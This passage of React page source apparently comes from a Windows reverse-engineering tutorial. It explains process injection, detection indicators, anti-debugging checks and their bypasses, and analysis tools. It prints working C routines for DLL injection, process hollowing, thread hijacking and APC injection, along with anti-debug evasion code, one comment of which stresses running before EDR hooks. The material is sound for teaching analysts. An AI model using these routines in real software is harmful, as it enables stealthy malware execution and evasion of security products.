              less detectable methods.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              The classic <strong>CreateRemoteThread + LoadLibrary</strong> technique is the most well-known: open the target, 
              allocate memory for a DLL path string, write the path, and create a remote thread starting at LoadLibraryA with 
              the path as its argument. Simple and effective, but heavily monitored by every EDR on the market. <strong>Process 
              hollowing</strong> takes a different approach: create a legitimate process in suspended state, unmap its original 
              image, write a malicious PE in its place, fix up the context, and resume. The malicious code runs under the 
              identity of the original process. <strong>APC injection</strong> uses the Asynchronous Procedure Call mechanism 
              to queue code execution in threads of the target process, executing when the thread enters an alertable wait state.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              More advanced techniques emerged to evade detection. <strong>Thread hijacking</strong> avoids creating new threads 
              entirely by suspending an existing thread, modifying its instruction pointer to point at injected code, and resuming. 
              <strong>Process doppelgänging</strong> abuses Windows transactional NTFS to create a process from a file that 
              never actually exists on disk. <strong>AtomBombing</strong> uses the global atom table and APC to achieve injection 
              without WriteProcessMemory. <strong>Early Bird</strong> injects before security software has a chance to hook the 
              target process by targeting a suspended process before its entry point executes. <strong>Module stomping</strong> 
              overwrites a legitimately loaded DLL's code section with malicious code, making the code appear backed by a real file.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, mb: 3 }}>
              <strong>Detection approaches</strong> for injection have evolved alongside the techniques. Monitoring for 
              suspicious combinations of process access rights, tracking cross-process memory operations, observing thread 
              creation in foreign processes, checking for unbacked executable memory regions (memory not backed by a file on 
              disk), and behavioral analysis of process relationships all contribute to detection. Modern EDR products 
              implement kernel-mode callbacks (PsSetCreateThreadNotifyRoutine, etc.) that cannot be bypassed from usermode. 
              Understanding both the attack techniques and their detection methods is essential for effective security research.
            </Typography>

            <Alert severity="warning" sx={{ mb: 3 }}>
              <AlertTitle>Detection Indicators</AlertTitle>
              <Grid container spacing={2}>
                <Grid item xs={12} md={4}>
                  <Typography variant="subtitle2" fontWeight="bold">Process Access</Typography>
                  <Typography variant="body2">OpenProcess with PROCESS_ALL_ACCESS or VM_WRITE | VM_OPERATION</Typography>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Typography variant="subtitle2" fontWeight="bold">Memory Anomalies</Typography>
                  <Typography variant="body2">RWX memory regions, unbacked executable memory</Typography>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Typography variant="subtitle2" fontWeight="bold">Thread Creation</Typography>
                  <Typography variant="body2">Threads starting in unusual memory regions</Typography>
                </Grid>
              </Grid>
            </Alert>

            <TableContainer component={Paper} variant="outlined" sx={{ mb: 3 }}>
              <Table size="small">
                <TableHead>
                  <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.1) }}>
                    <TableCell><strong>Technique</strong></TableCell>
                    <TableCell><strong>Description</strong></TableCell>
                    <TableCell><strong>APIs Used</strong></TableCell>
                    <TableCell><strong>Difficulty</strong></TableCell>
                    <TableCell><strong>Detection</strong></TableCell>
                  </TableRow>
                </TableHead>
                <TableBody>
                  {injectionMethods.map((m) => (
                    <TableRow key={m.name}>
                      <TableCell><strong>{m.name}</strong></TableCell>
                      <TableCell><Typography variant="body2">{m.description}</Typography></TableCell>
                      <TableCell><Typography variant="caption" sx={{ fontFamily: "monospace" }}>{m.apis}</Typography></TableCell>
                      <TableCell><Chip label={m.difficulty} size="small" color={m.difficulty === "Easy" ? "success" : m.difficulty === "Medium" ? "warning" : m.difficulty === "Hard" ? "error" : "default"} /></TableCell>
                      <TableCell><Chip label={m.detected} size="small" variant="outlined" color={m.detected === "Low" ? "success" : m.detected === "Medium" ? "warning" : "error"} /></TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>

            <Typography variant="h6" gutterBottom fontWeight="bold">Implementation Examples</Typography>

            <Accordion defaultExpanded>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Classic CreateRemoteThread + LoadLibrary</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography paragraph variant="body2" color="text.secondary">
                  The most well-known injection technique. Allocates memory in target process, writes DLL path,
                  and creates a thread that calls LoadLibrary. Highly detected but still commonly seen.
                </Typography>
                <CodeBlock title="DLL Injection via CreateRemoteThread">{`BOOL InjectDLL(DWORD pid, const char* dllPath) {
    // 1. Open target process with required access
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | 
        PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc) return FALSE;
    
    // 2. Allocate memory in target for DLL path
    size_t pathLen = strlen(dllPath) + 1;
    LPVOID remoteMem = VirtualAllocEx(hProc, NULL, pathLen, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) { CloseHandle(hProc); return FALSE; }
    
    // 3. Write DLL path to target process
    if (!WriteProcessMemory(hProc, remoteMem, dllPath, pathLen, NULL)) {
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc); return FALSE;
    }
    
    // 4. Get LoadLibraryA address (same in all processes due to ASLR of kernel32)
    LPVOID pLoadLibrary = GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    
    // 5. Create remote thread starting at LoadLibrary with DLL path as argument
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, 
        (LPTHREAD_START_ROUTINE)pLoadLibrary, remoteMem, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc); return FALSE;
    }
    
    // 6. Wait for thread to complete (optional)
    WaitForSingleObject(hThread, INFINITE);
    
    // 7. Cleanup
    VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Process Hollowing (RunPE)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography paragraph variant="body2" color="text.secondary">
                  Creates a legitimate process in suspended state, unmaps its image, writes malicious PE,
                  and resumes. Process appears legitimate in task manager but runs malicious code.
                </Typography>
                <CodeBlock title="Process Hollowing Implementation">{`BOOL ProcessHollow(LPCSTR legitExe, LPBYTE payload, DWORD payloadSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // 1. Create legitimate process in SUSPENDED state
    if (!CreateProcessA(legitExe, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return FALSE;
    
    // 2. Get thread context to find PEB and image base
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    
    // 3. Read PEB to get current image base
    LPVOID pebImageBase;  // PEB + 0x08 (x86) or + 0x10 (x64)
    #ifdef _WIN64
    ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10), 
        &pebImageBase, sizeof(LPVOID), NULL);
    #else
    ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 0x08), 
        &pebImageBase, sizeof(LPVOID), NULL);
    #endif
    
    // 4. Unmap original image using NtUnmapViewOfSection
    typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
    NtUnmapViewOfSection(pi.hProcess, pebImageBase);
    
    // 5. Parse payload PE headers
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(payload + pDos->e_lfanew);
    
    // 6. Allocate memory at payload's preferred ImageBase
    LPVOID newBase = VirtualAllocEx(pi.hProcess, 
        (LPVOID)pNT->OptionalHeader.ImageBase,
        pNT->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 7. Write headers
    WriteProcessMemory(pi.hProcess, newBase, payload, 
        pNT->OptionalHeader.SizeOfHeaders, NULL);
    
    // 8. Write sections
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNT);
    for (int i = 0; i < pNT->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (LPBYTE)newBase + pSection[i].VirtualAddress,
            payload + pSection[i].PointerToRawData,
            pSection[i].SizeOfRawData, NULL);
    }
    
    // 9. Update PEB with new ImageBase
    WriteProcessMemory(pi.hProcess, 
        #ifdef _WIN64
        (LPVOID)(ctx.Rdx + 0x10),
        #else
        (LPVOID)(ctx.Ebx + 0x08),
        #endif
        &newBase, sizeof(LPVOID), NULL);
    
    // 10. Set new entry point in thread context
    #ifdef _WIN64
    ctx.Rcx = (DWORD64)newBase + pNT->OptionalHeader.AddressOfEntryPoint;
    #else
    ctx.Eax = (DWORD)newBase + pNT->OptionalHeader.AddressOfEntryPoint;
    #endif
    SetThreadContext(pi.hThread, &ctx);
    
    // 11. Resume execution
    ResumeThread(pi.hThread);
    return TRUE;
}`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Thread Hijacking</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography paragraph variant="body2" color="text.secondary">
                  Suspends an existing thread, modifies its instruction pointer to point to shellcode,
                  and resumes. No new thread creation, making it stealthier.
                </Typography>
                <CodeBlock title="Thread Execution Hijacking">{`BOOL HijackThread(DWORD pid, DWORD tid, LPVOID shellcode, SIZE_T size) {
    // 1. Open process and thread
    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | 
        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid);
    
    // 2. Allocate memory for shellcode
    LPVOID remoteMem = VirtualAllocEx(hProc, NULL, size, 
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, remoteMem, shellcode, size, NULL);
    
    // 3. Suspend target thread
    SuspendThread(hThread);
    
    // 4. Get current thread context
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(hThread, &ctx);
    
    // 5. Modify instruction pointer
    #ifdef _WIN64
    ctx.Rip = (DWORD64)remoteMem;
    #else
    ctx.Eip = (DWORD)remoteMem;
    #endif
    
    // 6. Set modified context
    SetThreadContext(hThread, &ctx);
    
    // 7. Resume thread (now executes shellcode)
    ResumeThread(hThread);
    
    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">APC Injection (QueueUserAPC)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography paragraph variant="body2" color="text.secondary">
                  Queues an APC (Asynchronous Procedure Call) to a thread. Executes when the thread
                  enters an alertable wait state (SleepEx, WaitForSingleObjectEx, etc.).
                </Typography>
                <CodeBlock title="APC Injection">{`BOOL APCInject(DWORD pid, LPVOID shellcode, SIZE_T size) {
    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    
    // 1. Allocate and write shellcode
    LPVOID remoteMem = VirtualAllocEx(hProc, NULL, size, 
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, remoteMem, shellcode, size, NULL);
    
    // 2. Find threads in target process
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    
    Thread32First(hSnap, &te);
    do {
        if (te.th32OwnerProcessID == pid) {
            // 3. Queue APC to each thread (at least one should be alertable)
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (hThread) {
                QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0);
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hSnap, &te));
    
    CloseHandle(hSnap);
    CloseHandle(hProc);
    return TRUE;
}

// Early Bird variant: APC to main thread of suspended process
// CreateProcess(SUSPENDED) -> QueueUserAPC -> ResumeThread
// Executes before EDR hooks are applied!`}</CodeBlock>
              </AccordionDetails>
            </Accordion>
              </Paper>
            </Box>

            {/* Section: Anti-Debug */}
            <Box id="anti-debug" sx={{ mb: 5, scrollMarginTop: "180px" }}>
              <Paper sx={{ p: 4, borderRadius: 3 }}>
            <Typography variant="h5" gutterBottom fontWeight="bold">Anti-Debugging Techniques</Typography>
            
            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              <strong>Anti-debugging</strong> refers to techniques that software uses to detect or hinder analysis by debuggers. 
              Both malware and legitimate software (games, DRM systems, commercial applications) employ these techniques — 
              malware to evade analysis, legitimate software to protect intellectual property or prevent cheating. For reverse 
              engineers, understanding anti-debugging is essential not just for bypassing these protections, but also for 
              recognizing them as behavioral indicators during malware analysis. Heavy use of anti-debugging techniques is 
              itself suspicious and suggests the software has something to hide.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              Anti-debugging techniques can be categorized into several families. <strong>API-based checks</strong> use Windows 
              functions designed to detect debugging, like <code>IsDebuggerPresent</code> (which simply checks the PEB.BeingDebugged 
              flag) and <code>CheckRemoteDebuggerPresent</code> (which uses NtQueryInformationProcess internally). These are 
              trivial to bypass but often serve as a first line of defense. <strong>Structure-based checks</strong> directly 
              examine the PEB, TEB, and heap structures for debugging indicators — the NtGlobalFlag field (which has heap 
              debugging flags set when a debugger launches the process), heap metadata flags, and the BeingDebugged flag itself 
              accessed directly without API calls.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              <strong>Timing-based checks</strong> exploit the fact that stepping through code in a debugger is vastly slower 
              than normal execution. By measuring time between operations using RDTSC (CPU timestamp counter), GetTickCount, 
              or QueryPerformanceCounter, software can detect the slowdown characteristic of debugging. These checks are 
              harder to bypass because they don't rely on any specific flag or API — they measure real-world behavior. 
              Solutions involve modifying the timing values returned or using specialized tools that compensate for debugging 
              delays.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              <strong>Exception-based checks</strong> are among the most interesting. The INT 3 instruction (breakpoint) raises 
              an exception that debuggers catch; if the program's own exception handler doesn't run, a debugger is attached. 
              The INT 2D instruction triggers special behavior in kernel debuggers — if one is attached, the byte following INT 
              2D is skipped. Hardware breakpoints use the CPU's debug registers (DR0-DR7), which can be queried via 
              GetThreadContext; if any DRx register contains a non-zero value, breakpoints are set. The trap flag in EFLAGS 
              causes a single-step exception after each instruction; setting it and checking if the exception handler ran 
              reveals debugger presence.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, mb: 3 }}>
              <strong>Bypassing anti-debugging</strong> is a core skill for reverse engineers. Manual approaches include 
              patching check instructions with NOPs, modifying PEB/TEB fields in the debugger, and using debugger plugins that 
              automatically hide debugging artifacts. Tools like ScyllaHide (x64dbg plugin), TitanHide (kernel driver), and the 
              built-in anti-anti-debug features in modern debuggers handle common techniques automatically. For sophisticated 
              samples, you may need to trace through the anti-debug checks and patch them individually, or use emulation 
              frameworks like Unicorn/Qiling that don't trigger any debugging artifacts because they're not actually debugging.
            </Typography>

            <Alert severity="info" sx={{ mb: 3 }}>
              <AlertTitle>Anti-Debug Categories</AlertTitle>
              <Grid container spacing={2}>
                <Grid item xs={12} md={3}><Typography variant="body2"><strong>API-Based:</strong> IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQueryInformationProcess</Typography></Grid>
                <Grid item xs={12} md={3}><Typography variant="body2"><strong>PEB/TEB Flags:</strong> BeingDebugged, NtGlobalFlag, Heap flags, ProcessParameters</Typography></Grid>
                <Grid item xs={12} md={3}><Typography variant="body2"><strong>Timing:</strong> RDTSC, GetTickCount, QueryPerformanceCounter, timeGetTime</Typography></Grid>
                <Grid item xs={12} md={3}><Typography variant="body2"><strong>Exceptions:</strong> INT 2D, INT 3, trap flag, hardware breakpoints, CloseHandle</Typography></Grid>
              </Grid>
            </Alert>

            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "IsDebuggerPresent", desc: "Checks PEB.BeingDebugged flag (offset 0x02)", bypass: "Set PEB.BeingDebugged = 0", check: "if (IsDebuggerPresent()) ExitProcess(0);" },
                { name: "CheckRemoteDebuggerPresent", desc: "Uses NtQueryInformationProcess internally", bypass: "Hook NtQueryInformationProcess or patch return value", check: "BOOL dbg; CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);" },
                { name: "NtGlobalFlag", desc: "PEB.NtGlobalFlag has debug heap flags (0x70)", bypass: "Clear flags 0x70 in PEB+0x68 (x86) / PEB+0xBC (x64)", check: "if (*(DWORD*)(peb+0x68) & 0x70) detected();" },
                { name: "Heap Flags", desc: "Debug heaps have Flags=0x50000062, ForceFlags=0x40000060", bypass: "Patch heap header Flags and ForceFlags fields", check: "HeapFlags = *(DWORD*)(heap+0x40); // Windows 7+" },
                { name: "RDTSC Timing", desc: "Measure CPU cycles; debugging causes slowdown", bypass: "Hook RDTSC, use TitanHide, or patch timing checks", check: "t1 = __rdtsc(); code(); if (__rdtsc()-t1 > threshold) detected();" },
                { name: "QueryPerformanceCounter", desc: "High-resolution timing for detection", bypass: "Hook QPC or modify returned values", check: "Measures time between operations" },
                { name: "Hardware Breakpoints", desc: "Check DR0-DR7 debug registers via GetThreadContext", bypass: "Clear DRx registers, hide from GetThreadContext", check: "GetThreadContext -> check ctx.Dr0-Dr3" },
                { name: "INT 2D", desc: "Kernel debugger check; skips 1 byte if debugged", bypass: "Step over or NOP the instruction", check: "__asm { int 0x2d; nop; } // nop skipped if debugger" },
                { name: "OutputDebugString", desc: "Returns error code if no debugger attached", bypass: "Attach debugger or hook the function", check: "SetLastError(0); OutputDebugStringA(x); if (GetLastError()==0) debugger;" },
                { name: "NtSetInformationThread", desc: "ThreadHideFromDebugger hides thread from debugger", bypass: "Hook NtSetInformationThread, prevent call", check: "NtSetInformationThread(thread, 0x11, 0, 0);" },
                { name: "CloseHandle Exception", desc: "CloseHandle on invalid handle raises exception only under debugger", bypass: "Handle the exception in VEH", check: "CloseHandle((HANDLE)0xDEADBEEF); // exception if debugged" },
                { name: "NtQueryInformationProcess", desc: "ProcessDebugPort, ProcessDebugFlags, ProcessDebugObjectHandle", bypass: "Hook and modify returned values", check: "Query ProcessDebugPort (7) - non-zero if debugged" },
              ].map((tech) => (
                <Grid item xs={12} md={6} lg={4} key={tech.name}>
                  <Card variant="outlined" sx={{ height: "100%" }}>
                    <CardContent>
                      <Typography variant="subtitle1" fontWeight="bold" color="error">{tech.name}</Typography>
                      <Typography variant="body2" paragraph>{tech.desc}</Typography>
                      <Typography variant="caption" sx={{ fontFamily: "monospace", display: "block", mb: 1, color: "text.secondary" }}>{tech.check}</Typography>
                      <Chip icon={<VpnKeyIcon />} label={tech.bypass} size="small" color="success" variant="outlined" sx={{ fontSize: "0.7rem" }} />
                    </CardContent>
                  </Card>
                </Grid>
              ))}
            </Grid>

            <Typography variant="h6" gutterBottom fontWeight="bold">Anti-Debug Code Examples</Typography>

            <Accordion defaultExpanded>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">PEB-Based Checks</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock title="PEB Anti-Debug Checks">{`// 1. IsDebuggerPresent - checks PEB.BeingDebugged
if (IsDebuggerPresent()) {
    ExitProcess(0);
}

// 2. Direct PEB access (bypasses API hooks)
#ifdef _WIN64
PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

// BeingDebugged flag
if (pPeb->BeingDebugged) {
    ExitProcess(0);
}

// 3. NtGlobalFlag check
// Debug heap flags: FLG_HEAP_ENABLE_TAIL_CHECK (0x10)
//                   FLG_HEAP_ENABLE_FREE_CHECK (0x20)
//                   FLG_HEAP_VALIDATE_PARAMETERS (0x40)
#ifdef _WIN64
DWORD NtGlobalFlag = *(DWORD*)((PBYTE)pPeb + 0xBC);
#else
DWORD NtGlobalFlag = *(DWORD*)((PBYTE)pPeb + 0x68);
#endif
if (NtGlobalFlag & 0x70) {
    ExitProcess(0);  // Debug heap flags set
}

// 4. Heap flags check (Windows 7+)
PVOID pHeap = pPeb->ProcessHeap;
#ifdef _WIN64
DWORD HeapFlags = *(DWORD*)((PBYTE)pHeap + 0x70);
DWORD ForceFlags = *(DWORD*)((PBYTE)pHeap + 0x74);
#else
DWORD HeapFlags = *(DWORD*)((PBYTE)pHeap + 0x40);
DWORD ForceFlags = *(DWORD*)((PBYTE)pHeap + 0x44);
#endif
// Normal: Flags=2, ForceFlags=0
// Debug:  Flags=0x50000062, ForceFlags=0x40000060
if (HeapFlags != 2 || ForceFlags != 0) {
    ExitProcess(0);
}`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Timing-Based Checks</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock title="Timing Anti-Debug">{`// 1. RDTSC (Read Time-Stamp Counter)
DWORD64 t1 = __rdtsc();
// ... sensitive code ...
DWORD64 t2 = __rdtsc();
if ((t2 - t1) > 0x100000) {  // Too many cycles = stepping
    ExitProcess(0);
}

// 2. GetTickCount
DWORD t1 = GetTickCount();
// ... sensitive code ...  
DWORD t2 = GetTickCount();
if ((t2 - t1) > 1000) {  // > 1 second
    ExitProcess(0);
}

// 3. QueryPerformanceCounter (high resolution)
LARGE_INTEGER t1, t2, freq;
QueryPerformanceFrequency(&freq);
QueryPerformanceCounter(&t1);
// ... sensitive code ...
QueryPerformanceCounter(&t2);
double elapsed = (double)(t2.QuadPart - t1.QuadPart) / freq.QuadPart;
if (elapsed > 0.1) {  // > 100ms
    ExitProcess(0);
}

// 4. Anti-timing bypass: Run timing check multiple times
// If ANY iteration is slow, it's likely debugging
for (int i = 0; i < 10; i++) {
    DWORD t1 = GetTickCount();
    Sleep(1);  // Should be ~1ms
    if (GetTickCount() - t1 > 50) {  // Way too slow
        ExitProcess(0);
    }
}`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Exception-Based Checks</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock title="Exception Anti-Debug">{`// 1. INT 2D - Kernel debugger check
// If kernel debugger present, instruction after INT 2D is skipped
__try {
    __asm {
        int 0x2d
        nop       // Skipped if debugger present
    }
    // If we reach here normally = no kernel debugger
}
__except(EXCEPTION_EXECUTE_HANDLER) {
    // Exception caught = also no debugger
}

// 2. INT 3 (Breakpoint) with SEH
BOOL debuggerDetected = TRUE;
__try {
    __asm int 3
}
__except(EXCEPTION_EXECUTE_HANDLER) {
    debuggerDetected = FALSE;  // Exception caught = no debugger
}
if (debuggerDetected) ExitProcess(0);

// 3. Single-step trap flag check
BOOL trapFlagDetected = FALSE;
__try {
    __asm {
        pushfd
        or dword ptr [esp], 0x100  // Set trap flag
        popfd
        nop  // Single-step exception here
    }
}
__except(EXCEPTION_EXECUTE_HANDLER) {
    trapFlagDetected = TRUE;
}
if (!trapFlagDetected) ExitProcess(0);  // Debugger swallowed exception

// 4. Hardware breakpoint detection
CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
GetThreadContext(GetCurrentThread(), &ctx);
if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
    ExitProcess(0);  // Hardware breakpoints set
}`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Anti-Debug Bypass Tools</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Grid container spacing={2}>
                  {[
                    { name: "ScyllaHide", desc: "x64dbg/OllyDbg plugin, comprehensive anti-anti-debug", features: "PEB patches, timing hooks, exception handling" },
                    { name: "TitanHide", desc: "Kernel driver for system-wide anti-anti-debug", features: "Hooks NtQueryInformationProcess, RDTSC, etc." },
                    { name: "x64dbg Built-in", desc: "Options > Preferences > Anti-anti-debug", features: "Basic PEB patches, exception hiding" },
                    { name: "SharpOD", desc: "OllyDbg plugin for anti-debug bypass", features: "Classic plugin, many options" },
                  ].map((tool) => (
                    <Grid item xs={12} md={6} key={tool.name}>
                      <Card variant="outlined">
                        <CardContent>
                          <Typography variant="subtitle1" fontWeight="bold" color="primary">{tool.name}</Typography>
                          <Typography variant="body2">{tool.desc}</Typography>
                          <Typography variant="caption" color="text.secondary">{tool.features}</Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                  ))}
                </Grid>
              </AccordionDetails>
            </Accordion>
              </Paper>
            </Box>

            {/* Section: Tools */}
            <Box id="tools" sx={{ mb: 5, scrollMarginTop: "180px" }}>
              <Paper sx={{ p: 4, borderRadius: 3 }}>
            <Typography variant="h5" gutterBottom fontWeight="bold">Essential RE Tools for Windows</Typography>
            
            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              A professional reverse engineering workflow relies on a carefully curated collection of tools, each serving 
              specific purposes in the analysis process. The tools fall into several categories: <strong>static analysis 
              tools</strong> (disassemblers and decompilers that analyze code without execution), <strong>dynamic analysis 
              tools</strong> (debuggers and monitors that observe code during execution), <strong>behavioral monitoring 
              tools</strong> (utilities that track file, registry, network, and API activity), and <strong>automation 
              frameworks</strong> (scripting environments and libraries for building custom analysis tools). Mastery of 
              these tools and knowing when to use each is what separates efficient analysts from those who struggle.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              <strong>Static analysis</strong> forms the foundation of reverse engineering. Before executing unknown code 
              (which may be malicious), analysts examine it statically to understand its structure, identify interesting 
              functions, recognize known library code, and develop hypotheses about its behavior. Modern disassemblers like 
              Ghidra and IDA Pro not only translate machine code to assembly but also recover high-level constructs through 
              decompilation, dramatically accelerating analysis. They identify function boundaries, resolve cross-references, 
              apply type information, and integrate with symbol servers to label known functions automatically.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              <strong>Dynamic analysis</strong> complements static work by observing actual behavior. Debuggers let you 
              execute code instruction by instruction, inspect memory and registers, set breakpoints at critical points, 
              and trace execution flow. For Windows reverse engineering, x64dbg has become the standard open-source choice 
              for usermode debugging, while WinDbg remains essential for kernel debugging and crash dump analysis. The 
              ability to modify code and data during execution makes debugging invaluable for bypassing protections, 
              understanding obfuscated code, and testing hypotheses developed during static analysis.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              <strong>Behavioral monitoring</strong> reveals what software actually does without requiring deep code 
              understanding. Process Monitor captures every file and registry operation, showing you exactly what 
              persistence mechanisms are being established or what files are being accessed. API Monitor intercepts 
              Windows API calls with full parameter logging, revealing what functions are being called and with what 
              arguments. Network monitors capture communication attempts. These tools are often the fastest way to 
              understand malware behavior and identify indicators of compromise.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, mb: 3 }}>
              <strong>Automation and scripting</strong> multiply your effectiveness. Python has become the lingua franca 
              of security research, with libraries like pefile for PE parsing, capstone for disassembly, unicorn for 
              emulation, and angr for symbolic execution. Writing scripts to automate repetitive tasks, extract configuration 
              data from malware samples, or build custom deobfuscation tools is a critical skill. Both Ghidra (Python/Java) 
              and IDA Pro (IDAPython) support scripting for extending their analysis capabilities, enabling automation of 
              complex analysis tasks that would be impractical to perform manually.
            </Typography>

            <Alert severity="success" sx={{ mb: 3 }}>
              <AlertTitle>Recommended Free Setup</AlertTitle>
              <Typography variant="body2">
                <strong>Static Analysis:</strong> Ghidra (decompiler) + PE-bear (PE viewer) + Detect It Easy (triage)<br/>
                <strong>Dynamic Analysis:</strong> x64dbg (debugging) + Process Monitor (file/reg) + API Monitor (calls)<br/>
                <strong>Automation:</strong> Python + pefile + capstone + unicorn
              </Typography>
            </Alert>

            <Typography variant="h6" gutterBottom fontWeight="bold">Debuggers</Typography>
            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "x64dbg", cat: "User-mode", desc: "Modern open-source x86/x64 debugger. Plugin ecosystem, scripting, active development.", url: "x64dbg.com", features: "Plugins, trace, conditional BPs, symbol loading", price: "Free" },
                { name: "WinDbg (Preview)", cat: "User/Kernel", desc: "Microsoft's debugger for user-mode and kernel debugging. Best for crash dump analysis.", url: "MS Store", features: "Kernel debug, crash dumps, Time Travel Debugging", price: "Free" },
                { name: "OllyDbg", cat: "User-mode", desc: "Classic 32-bit debugger. Still useful for legacy analysis.", url: "ollydbg.de", features: "Tracing, analysis, plugins", price: "Free" },
                { name: "Immunity Debugger", cat: "User-mode", desc: "OllyDbg fork with Python scripting. Popular for exploit dev.", url: "immunityinc.com", features: "Python API, mona.py plugin", price: "Free" },
              ].map((tool) => (
                <Grid item xs={12} md={6} key={tool.name}>
                  <Card variant="outlined">
                    <CardContent>
                      <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                        <Typography variant="subtitle1" fontWeight="bold">{tool.name}</Typography>
